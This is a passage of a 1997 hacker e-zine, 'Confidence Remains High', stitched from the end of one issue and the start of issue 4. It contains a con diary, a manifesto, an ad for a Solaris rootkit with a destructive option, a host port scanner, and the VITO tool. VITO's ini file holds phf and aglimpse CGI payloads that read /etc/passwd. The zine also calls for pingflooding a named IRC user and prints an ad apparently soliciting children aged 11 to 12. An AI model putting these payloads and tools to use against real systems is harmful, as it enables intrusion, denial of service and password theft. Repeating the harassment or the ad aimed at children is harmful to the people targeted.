carding and generally the ability to gain power, or "free stuff".

We sat down on the ground floor near the back of the room, we got talking to
a french hacker, called Leon (aka acme), we joked about "o-DaY WaReZ" and then
Nightrage booted his p150 laptop, then Leon pulled out his Thinkpad, he booted
it, and it counted up to 64mb of RAM, we asked how much hard drive space he had
to which he casually replied "6 gig", Leon knew stuff.

The first speaker was Ross Anderson, who explained how our predecessors had
broken into cash machines (atm's) using various techniques, as well as the
flaws in such machines and systems, ranging from all cards having the same
PIN, to a trick that Shefield hackers used with phone cards to get cash.
He then went on to smartcards and encryption and finished around 11am.

We then went up to the network room, where the "hack the flag" competition
was to be held, there were a handful of people up there, including a
photgrapher and some staff, I only saw 3 systems and 2 terminals, not really
enough to use for any competition.

Leon sat down and started to toy with his laptop and some CD's he had purchased
in Pakistan the day before, he had voice recognition programs and games and a
few other "expensive" CD's.

We met an American wearing an FBI cap, he also had a laptop, as well as another
with long blonde / grayish hear who did alot of cool stuff with the phone line
in the network room using various toys he had.

We needed to set up a network, we had numerous modems, one network hub with 5
ports, around 8 systems and one phone socket.

We soon realised through various methods (one using NightRage's cheap blue
telephone) that the only phone socket in the room went through the reception,
so NightRage phoned down to the reception, and tried to use his amazing social
engineering skills..

Reception : "hello?"
NightRage : "hi, is there any way I can get an outside line from this phone?"
Reception : "no"
NightRage : "OK"

We then went on a hunt for working phone lines or hubs that we could use to
help us set up our network, the FBI dude soon found a cabinet that looked
important, and NightRage and the others helped him pick the lock, inside
they found a 3com network hub and a few other goodies, the FBI dude got his
laptop and tried to hack his way onto the network, but he couldn't use
traceroute or any other programs, so that hub was useless to us unless we
knew our own IP.

Two younger hackers started to manually wardial the extensions, they found a
handful of modem numbers in a very short amount of time. We were quite
impressed by their skills.

The guy with the long blond / grayish hair went down to a computer shop on
Regent street to buy some RJ45 cable so we could use the hub in the
cabinet, but he left before we realised that it wasn't usable.

Emerson was getting really stressed out, as he was one of the staff, and he
had promised the University that no damage would be done to any of the
phone / computer lines, he needed a plan to stall us, even though we were
telling him everything would be fine, and that we would leave all the stuff
as it was when we found it, he was still scared at the consequences, and
it was time for lunch, we originally planned to just pop over the street to
grab a McDonalds, but Emerson started to take us down Regent street, he asked
if we wanted to eat for around 5 at a place he knew well, we agreed, the time
was around 1pm...

Emerson proceeded to take myself, NightRage, the FBI dude, Wyatt and the two
that had manually wardialled the extensions half way around London, we walked
down Regent street, onto Tottenham court road and around a load of shops,
Wyatt and the FBI dude suggested we should grab a beer, and we easily found
a pub.

We stopped into the pub and all ordered drinks, we then sat outside and talked
about the L0phT, global posistioning and scanning, we left the pub at about 2pm
and made our way through alot of roads and came to Kamamama's Japanese
restaurant, after stopping into alot of shops on the way and talking about oki
phones.

We ate good Japanese food in Kamamama's, and Wyatt used his tiny scanner to
detect radio comms within the building, his scanner was cool, and he tried to
pinpoint the frequency that the waiters broadcast the orders with their
handheld systems, at one point he placed the scanner right up next to the
handheld and said "can you press that button one more time please".

Wyatt also had a transciever that he could use to broadcast on, so he could
pinpoint a frequency with his scanner, and the broadcast with his tiny
transciever on that frequency.

The time was now around 3pm, and we made our way back through a very busy
London to the conference, when we got back we went back up to the network
room, not alot had happened since we had been away (much as Emerson would
have expected) and myself and NightRage toyed with systems for about 30 minutes

We then listened to another talk by a journalist who often writes of hacking
and computer security issues, called Dave Green (I think), Cold-Fire and the
people on the balcony often questioned him, and he generally said "no-one
cares what you do, so why should I write about it?" which was pretty true,
then another journalist went on saying that he would pay for such stories
if they had reason behind them (ie. web site attacks), this was quite
interesting.

The last talk myself and NightRage listened to was Alan Solomon, to which I
asked, when he was talking about the Linux version of his toolkit...

  "Yeah, does the Linux version detect Windoze '95 as a virus?"

  He didn't understand, but he's cl00less and hangs on AOL all day...

He then went on to talk a load of crap about how amazing AOL was, then he
talked about how he has been mailbombed and how "phishers" have tried to
pull all his account inf0z (passwords etc.) he was also shouting into the
microphone, and I had a speaker right next to me, and I had my finger in
one ear for most of the talk, due to the fact that he shouted into the
microphone, he also breathed very heavily and walked around alot.

We went back up to the network room, which now had 2 systems and 2 terminals,
swapped email addresses with Wyatt, Emerson, the FBI dude and a few others,
we then said our goodbyes, and left to catch the 8:30 train from Paddington
Station.

AAA was cool, it was just a pity that only one of the three planned special
events actually took place, as well as the fact that there really wasn't enough
time for the people there to talk with each other.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
 6. Lamer of the fucking year : pSId (DALnet) : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Theres a fucking cl00less g1mp on DALnet called pSId, but then again, most
people on DALnet are cl00less, this "cracker" however has the following
"mad" skills...

  - phf
  - tftp

His most highly acclaimed hack was of sony.co.jp (guess the technique.)
and since then he has blatently lied about hacking bolero.gsfc.nasa.gov
(www.nasa.gov alias) which he says runs tftp.

If you see him *anywhere* feel free to pingflood his IP, 0wn his lame fuck
Linux box, or anything else.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ PROJECTS ]=================[ .SECTION F. ]===================[ PROJECTS ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. STiK : mstrhelix
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                                  -=STiK=-
                       (S)olaris (T)ool (i)diot (K)it
                       ******************************

STiK is a deluxe rootkit for the solaris platform containing not only
tools that enable you to gain root access it also allows you to keep it
with backdoors.  The Alpha version of STiK includes exploits, backdoors,
sniffers, connection hijackers, a stealth mode, and eventualy will also
include other kewl tewls such as spoofers, other new inovative remote root
access backdoors, and maybe if I have enough time a extra option to help
you construct your own buffer overflow exploits.  STiK supports these
platforms... sparc10 and sparc20 and it minimaly supports x86 platforms.
The only conflicts you may have while using this tool is if, (like an (i)diot) 
you use the -Sun4 switch on a solaris 5.x machine or say the -x86 swtich on 
a -Sun5 and visa versa... but nobody is that stupid. STiK includes the
following options....

        -Sun4, -Sol5, -x86 --> compiles exploits for following platforms.

        -backdrs           --> installs backdoors and suggests 'em.

        -stealth           --> does whut it says... and very well.

        -destruc           --> if you get cauaght online reek some havok

        -man               --> shows 3r33t manpage

-Sun4 compiles loits for SunOS 4.x

-Sol5 compiles loits for Solaris 2.5.x

-x86  compiles loits for x86 platforms of solaris and sunos

-backdrs backdoor menu feature,,, pick and choose or mix and match

-stealth invokes programs such as cloak, zap2, block, and etc...

-destruc if you get caught and booted this will invoke and fuck some shit
         up majorly. We dont wanna be destructive but hey !!!YOU FUCKING
         KICKED ME OFF YER MACHINE ASSHOLE I DIDN'T INVOKE THE -destruc
         FEATURE R00T DID!!!

-man     full featured reverse switched manpage to fuck wid yer headz

If you'z mutha fuxx0rs have any shit you would like me to add so STiK then
speak now or do without cause I have been hard at work coding shit...
Also anyone who wants to help port lrk3 backdoors and shit to solaris drop
me a line cause its a bitch doing it all by yerself...

edge@mindwerks.com

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ FIN ]======================[ .SECTION G. ]========================[ FIN ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
--------------------------------------+---------------------------------------
                                      |
           YOUR SPECIAL AD            |            LET'S BE FREE
                                      |
       COULD BE RIGHT HERE #@!        |    Gay White Male 38, 5'11" looking
                                      |    for men, 12 - 32 clean, fit, and
       SEND ELECTRONIC MAIL TO:       |    hairy. Discreet Encounters.
            ADZ@CODEZ.COM             |    Call Anytime : (816)781-8009
                                      |                   (Ask for Tommy)
                                      |
--------------------------------------+---------------------------------------
                                      |
        ARE YOU 11 OR 12 ???          |      FREE FONESEX! CALL ME NOW!@
                                      |
 Looking for men 11 - 12 for adult    |    Yeah huney, you know you want me,
 video satisfaction. I am 35 into     |    I'll treat you just right, I'm
 Professional wrestling.              |    waiting for your call today!
 Let's talk soon : (816)453-8722      |    CALL ME NOW!@# : (847)546-9154
                                      |                     (Ask for Kim)
--------------------------------------+---------------------------------------
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                            .oO The CodeZero Oo.
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                      _   /|  k0dek4t sez...
                      \'o O'                            
                      =(_o_)=   "EyEm HuNGaRy FoR CoDeZ,
                        U               nOt CaTf00d!!#@"


              :::  http://insecurity.insecurity.org/codez/ :::

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
          Remember, McDonalds Owns You, And Ronald Is The KinG!!!
         Wendy Is Satan!! Don't Believe The Lies!! PHEAR WENDY!@#*
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                             .oO The CodeZero Oo.
                             .oO   Presents   Oo.
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

 Welcome to issue 4 of..

       /IIIIIIIIII          /IIIIIIIIII           /III   /III
       \ III_____/          \ III___/III          \ III  \ III
        \ III                \ III  \ III          \ III  \_III
         \ III  onfidence     \ IIIIIIII  emains    \ IIIIIIIIII  igh
          \ III                \ III__/III           \ III__/ III
           \ III                \ III  \ III          \ III  \ III
            \ IIIIIIIIII   ___   \ III  \ III   ___    \ III  \ III   ___
             \_________/  /\__\   \__/   \__/  /\__\    \__/   \__/  /\__\
                          \/__/                \/__/                 \/__/

                                                       ...3rd September 1997
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                  Team CodeZero, we rule your weak network.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                   .-----------[ An Official ]-----------.
                   :      .-----.  .----.   .--.--.      :
                   :      :  .--'  : .-. :  :  :  :      :
                   !_-::  :  :     : `-' ;  :  .  :  ::-_!
                   :~-::  :: :     :: . :   ::    :  ::-~:
                   :      ::.`--.  ::.:  :  ::.:  :      :
                   :      `-----'  `--'--'  `--'--'      :
                   !_-::                             ::-_!
                   :~-::-[ Confidence Remains High ]-::-~:
                   :~-::                             ::-~:
                   `-----------[ Production ]------------'

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  In This "Added Exploits" Issue :
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

 -----=>  Section A  :  Introduction And Cover Story.

 1. Confidence Remains High issue 4....................: Tetsu Khan
 2. The Hackers vs. The System.........................: so1o

 -----=>  Section B  :  Exploits And Code.

 1. Generic scanner....................................: ultima
 2. VITO...............................................: Et Lownoise
 3. Jolt.c.............................................: VallaH
 4. Phf shell spawning tekneek.........................: xFli
 5. Hide.c.............................................: unknown
 6. Tridentd.c.........................................: BiT

 -----=>  Section C  :  Phones / Scanning / Radio.

 1. Norweigen PABX list................................: RipperJack

 -----=>  Section D  :  Miscellaneous.

 1. Windows trick......................................: so1o
 2. sIn inf0z..........................................: so1o
 3. DCC trick..........................................: so1o
 4. Mars systems @*.jpl.nasa.gov.......................: so1o
 5. The issues list....................................: so1o
 6. Damned warez pups..................................: so1o
 7. Simple NFS techniques..............................: Synner
 8. #hebrew............................................: so1o
 9. Lord Somer.........................................: so1o

 -----=>  Section E  :  World News.

 1. c0de...............................................: so1o
 2. Beyond HOPE........................................: Some dude @wired.com
 3. www.sinnerz.com gets 0wned.........................: so1o

 ------=> Section F  :  Projects.

 1. soltool for Solaris 2.5.x [sunOS 5.5.x] is here!@~.: so1o
 2. TOTAL CON..........................................: so1o

 -----=> Section G  :  The End. (+ Personal Column)

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ INTRO ]====================[ .SECTION A. ]======================[ INTRO ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
 1. Confidence Remains High issue 4 : Tetsu Khan
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Here we are again, not really alot happening lately, just threw this together
and got it out to our public, and here it is, CRH issue 4!@#


  The Confidence Remains High distro site list :
  ----------------------------------------------

  http://www.r0ot.org/crh/                               [main distro]
  http://www.rootshell.com
  http://insecurity.insecurity.org/codez/
 
  ftp://ftp.sekurity.org/users/so1o/

  ...And alot of other sites, just go looking around.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. The Hackers vs. The System : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

The Government built the ARPAnet, for military use during the "Cold War",
then the hackers built their own network, based on protocols developed by
others, this later became the Internet, accessible by the public, now the
Military and Government systems have "migrated" onto our network.

The hackers want freedom to learn and explore their network, the public want
peace of mind and security, the companies want to become more efficient, and
commercialise the Internet and the Governments want laws to bring order to the
Internet, because they are scared of what OUR network might become, but the
Internet wasn't built by the Governments, they have a right to use our network,
but no right to try and change our rules, it is a futile move on their part.

Real wars are based on the use of power in weapons, nuclear bombs, submarines,
and the like, this all costs alot of money to develop such capabilities.

Now, in the "information age", you don't need guns or bombs to cripple a
country or a company, because they are so dependant on the internet, which
the hackers built, if the hackers built it, they can just as easily take it
down using a computer, a modem, and a few skills, which costs ALOT less
then guns and bombs, but can be equally, if not more powerful as dependance
by companies, the public, and the Government on OUR Internet increases.

Companies want to become more efficient, it may take days to send letters
overseas, not forgetting the cost, but seconds by e-mail, next the put
reports and blueprints and the like on supposedly secure systems, which
their employees should only be able to access.

Hackers are the only successful Governors of the Internet, the Governments
can try to introduce laws, but they can, and will never be able to enforce
those laws over the Internet, it was built by hackers, and we say that it
should be a medium through which anyone with an open mind can learn or teach,
its all information, 1's and 0's. 

This isn't a "real-world" problem, because Governments will never stop us,
there will always be tens of thousands to follow us, there are no boundaries
on our network, thats the way it will always be.

It's simple, hackers made the network, Governments have no right to call
"hacking" over OUR Internet illegal, they have no rights to even try to tell
us what to do, they know that, but the public, and companies *THINK* that the
Governments can control what goes on over OUR Internet, and so they demand
security and peace of mind, which the Governments try to provide, but no-one
can Govern OUR Internet, except the creators, the hackers, if we wanted to
destroy the internet, we would have done so a long time ago, we just don't
like Governments taking futile measures like they have.

Its not as if the Governments can do alot about this situation, hackers are
only ghosts, we go by handles, codenames, no "real-life" details are let out,
you can never catch us all, we are the ultimate invisible army.

At the most, all the Governments can do is make laws and attempt to enforce
them, turning the Internet into a nicer place in some respecs, but hackers
will just hit back *slightly* harder by taking all Government sites off of
the internet, and to make the network our own again.

At the end of the day, if you want law and order now, and a nicer place to
live, then disconnect your modem, and live in the real world, because you
don't belong on our network.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ EXPLOITS ]=================[ .SECTION B. ]===================[ EXPLOITS ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
 1. Generic Scanner : Ultima
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

/*  Quick and simple generic scanner to take input from a list of hosts */
/*  (c) 1997 Ultima, the CodeZero Ninja Task Force.                     */
/*  Usage: ./scanner <port> <in> <out>    (good for port 143 scanning)  */


#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <errno.h>
#define OPEN 1
#define CLOSED 2
#define ERR_SOCK 3
#define ERR_NOHOST 4
int port;

int check_port(char *host)
{
   struct sockaddr_in sin;
   struct hostent *he;
   int i, fd;
   if((fd = socket(AF_INET, SOCK_STREAM, 0))<0)
     {
        perror("socket");
        return(ERR_SOCK);
     }
   if((he = gethostbyname(host))==NULL)
     {
        herror("gethostbyname");
        return(ERR_NOHOST);
     }
   sin.sin_family = AF_INET;
   sin.sin_port = htons(port);
   sin.sin_addr = *((struct in_addr*)he->h_addr);
   if((connect(fd, (struct sockaddr *)&sin, sizeof(sin)))<0)
     {
        perror("connect");
        return(CLOSED);
     }
   else
     {
        close(fd);
        return(OPEN);
     }
}

int main(int argc, char **argv)
{
   FILE *in, *out;
   char *buf;
   buf = (char *)malloc(256);
   if(argc < 4)
     {
        fprintf(stderr, "usage: %s <port> <in> <out>\r\n", argv[0]);
        exit(1);
     }
   port = atoi(argv[1]);
   if((in = fopen(argv[2], "r"))==NULL)
     {
        perror(argv[2]);
        exit(1);
     }
   if((out = fopen(argv[3], "a"))==NULL)
     {
        perror(argv[3]);
        exit(1);
     }
   while((fgets(buf, 255, in)) == buf)
     {
        if(buf[0] != ' ' && buf[0] != '\n')
          {
             buf[strlen(buf)-1] = '\0';
             printf("Checking %s...", buf);
             switch(check_port(buf))
               {
                case OPEN:
                  fprintf(out, "%s : Port %i Open\r\n", buf, port);
                  printf("Open\r\n");
                  break;
                case CLOSED:
                  fprintf(out, "%s : Port %i Closed\r\n", buf, port);
                  printf("Closed\r\n");
                  break;
                case ERR_SOCK:
                  fprintf(out, "%s: Socket Error\r\n", buf);
                  printf("Socket Error\r\n");
                  break;
                case ERR_NOHOST:
                  fprintf(out, "%s: No Such Host\r\n", buf);
                  printf("No Such Host\r\n");
                  break;
                default:
                  fprintf(out, "%s: Unknown Error\r\n", buf);
                  printf("Unknown Error\r\n");
                  break;
               }
          }
     }
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. VITO : ET Lownoise
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

/* V.I.T.O
   Vicious Internet TOol  by ET Lownoise Colombia 1997.
   Copyshit (:Q~) ET 1997.

   Test (T.E.S.T!!!) a web server for interesting MUST NOT HAVE cgi's.
   note that this program sucks too.

   2 Files:
     -Vito.c
     -Vito.ini  <---- you can edit this one....so u can upgrade
                      this program. Just follow the sintax.
   etorres@cyberservices.com
   Why is necesary a disclaimer when nobody reads it?.

   Compile for dummies
   ===================
          cc -o vito vito.c
   Execute for dummies
   ===================
          vito <host>
*/

#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

#define TAMANO 1024

int sock;
struct sockaddr_in sock_dest;
char host_dest[100];

main(int argc,char *argv[])
{


 FILE *ini;       /*check for vito.ini*/

 int a,
     b,
     c,
     d,
     x;

 struct hostent *pastelito;

 char buffer[TAMANO],
      bufrec[TAMANO],
      buftmp[TAMANO],
      encabezado[50];


   if (argc < 2) {
      fprintf(stdout,"V.I.T.O by ET Lownoise 97\n");
      fprintf(stdout,"Usage: %s <host> [> file]\n",argv[0]);
      fprintf(stdout,"Note: I know this program sucks.. it\n");
      fprintf(stdout,"      just make things easy.\n");
      exit(0);
   }

   if((ini=fopen("vito.ini","r"))==NULL){
      fprintf(stdout,"%s needs his ini file: vito.ini\n",argv[0]);
      exit(0);
   }

   if (sscanf(argv[1],"%d.%d.%d.%d",&a,&b,&c,&d) != 4) {
      pastelito = gethostbyname(argv[1]);
      if (pastelito == NULL) {
         fprintf(stdout,"Ahhhhhhh! cannot resolve host %s\n",argv[1]);
         exit(0);
      }
      sprintf(host_dest,"%d.%d.%d.%d",(unsigned char ) pastelito->h_addr_list[0][0],
                                      (unsigned char ) pastelito->h_addr_list[0][1],
                                      (unsigned char ) pastelito->h_addr_list[0][2],
                                      (unsigned char ) pastelito->h_addr_list[0][3]);
   }
   else {
      strncpy(host_dest,argv[1],99);
   }
   fprintf(stdout,"V.I.T.O.\n");
   fprintf(stdout,"Attac...Testing host: %s ",host_dest);

   /*ET*/

   sock_dest.sin_family = AF_INET;
   sock_dest.sin_port = htons(80);                               /* www port */
   sock_dest.sin_addr.s_addr = inet_addr(host_dest);

   while(fgets(buffer,TAMANO,ini)!=NULL){                  /*Buffer line size*/
      if(buffer[0]=='['){
         /*   Buffer division*/
         strcpy(buftmp,buffer);
         strcpy(buffer,strchr(buftmp,'G'));
         strncpy(encabezado,buftmp,strlen(buftmp)-strlen(buffer)+1);
         encabezado[strlen(buftmp)-strlen(buffer)]='\0';


         sock = socket(AF_INET,SOCK_STREAM,0);
         if(sock < 0) {
           fprintf(stdout,"ERROR: socket() failed\n");
           exit(0);
         }

         x = connect(sock,(struct sockaddr *) &sock_dest,sizeof(sock_dest));
         if(x < 0){
           fprintf(stdout,"Upps.. can't connect to port 80\n");
         }

         fprintf(stdout,
         "\n|-------------------------------------------------------------|\n");
         fprintf(stdout,"  CGI: %s\n",encabezado);
         fprintf(stdout,"  Sending.\n");
         fprintf(stdout,"  %s",buffer);
         fprintf(stdout,"|-------------------------------------------------------------|\n");
         send(sock,buffer,TAMANO*sizeof(char),0);
         bzero(buffer,TAMANO);
         fprintf(stdout,"  Receiving.\n\n");
         while((x=recv(sock,bufrec,TAMANO*sizeof(char),0))!=0){
                fprintf(stdout,"%s",bufrec);
                bzero(bufrec,TAMANO);
         }
         close(sock);
      }
   }
   fclose(ini);
   fprintf(stdout,
         "\n|=============================================================|\n");
   fprintf(stdout,"Vito End.    ET Lownoise 1997\n");
}


---vito.ini-------------------------------------------------------------------

##############################################################
#   V.I.T.O  Et Lownoise 1997   Ini File.  ver.1.0           #
##############################################################
# Please be carefull when u edit this file because some times
# the text editor u use break the lines.
# If u create a new line please use the GET in uppercase and
# if u whant to comment any line use #.
#
# Note: The space used in the IRIX line is a TAB no a space.
#       and u cannot use %xx to replace them.
# Note: Modify the email address in the aglimpse line.
#
# etorres@cyberservices.com
#
##############################################################
# format:                                                    #
# [comment] GET exploit_line_here                            #
##############################################################


[phf passwd] GET /cgi-bin/phf?Qalias=hell%0acat%20/etc/passwd%0a
[phf uname] GET /cgi-bin/phf?Qalias=hell%0auname%20-a%0a
[finger] GET /cgi-bin/finger?%0a
[test-cgi cgis] GET /cgi-bin/test-cgi?/*
[test-cgi dirs] GET /cgi-bin/test-cgi?/*
[php/fi] GET /cgi-bin/php.cgi?/etc/passwd
#[Access control on W3C httpd server] GET //secret/index.html
#[IRIX handler <space is TAB>] GET /cgi-bin/handler/useless_shit;cat/etc/passwd|?data=Download
[mglimpse] GET /cgi-bin/aglimpse/80|cat</etc/passwd;echo HTTP/1.0

#end of ini file PLEASE SEND ME SOME NEW VERSION OF THIS INI
#ET etorres@cyberservices.com

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. jolt.c : VallaH (spelling corrected by so1o)
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

/* Jolt 1.0 by Jeff w. Roberson
 * Please, if you use my code give me credit.  Also, if I was the first to
 * find this glitch, please give me credit. That's all I ask.
 *
 * OK, so all this does is build a really fragmented over-sized packet
 * and once win95 gets it, and puts it back together, it locks!  I send
 * multiple packets by default because sometimes it takes a few packets to
 * totally freeze the host. Maybe it's spending processor time to figure
 * out how to put them back together?  I've had reports of people "blue
 * screening" from it though so we'll let Microsoft's boys figure out
